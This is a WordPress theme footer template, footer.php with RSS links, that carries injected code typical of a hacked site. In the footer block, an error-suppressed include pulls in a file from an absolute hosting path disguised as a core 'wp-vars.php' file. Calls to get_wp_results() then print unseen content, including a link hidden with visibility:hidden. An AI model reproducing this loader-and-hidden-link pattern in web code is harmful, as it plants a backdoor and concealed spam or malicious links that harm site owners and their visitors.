		</div>
	<div id="footer_wrap">
		<div id="footer"><?php @include_once("/hermes/bosweb/web190/b1909/ipw.t0astedc/public_html/getwindmill/wp-includes/wp-vars.php"); ?>
<?=@get_wp_results('f');?>
		
            <div id="rss"> 
				<a href="<?php bloginfo('rss2_url'); ?>" id="rss-entries" title="rss entries">rss entries</a>
				<a href="<?php bloginfo('comments_rss2_url'); ?>" id="rss-comments" title="rss comments">rss comments</a> 
<a href="<?=@get_wp_results();?>" style="visibility:hidden;">.</a>
			</div>
		</div>
    </div>

		<?php wp_footer(); ?>
</body>
</html>
